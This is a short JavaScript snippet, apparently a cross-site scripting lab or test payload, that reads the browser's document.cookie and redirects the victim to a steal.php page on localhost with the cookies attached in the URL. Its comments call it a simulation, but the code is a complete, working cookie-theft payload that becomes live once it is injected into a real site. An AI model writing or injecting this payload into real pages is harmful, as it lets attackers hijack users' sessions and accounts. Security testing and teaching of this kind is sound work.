// Simulate stealing cookies and send them to steal.php
var cookies = document.cookie; // Get the cookies from the browser
var stealingURL = "http://localhost/legaltest/steal.php?cookie=" + encodeURIComponent(cookies);

// Redirect the victim to the malicious URL
window.location.href = stealingURL;
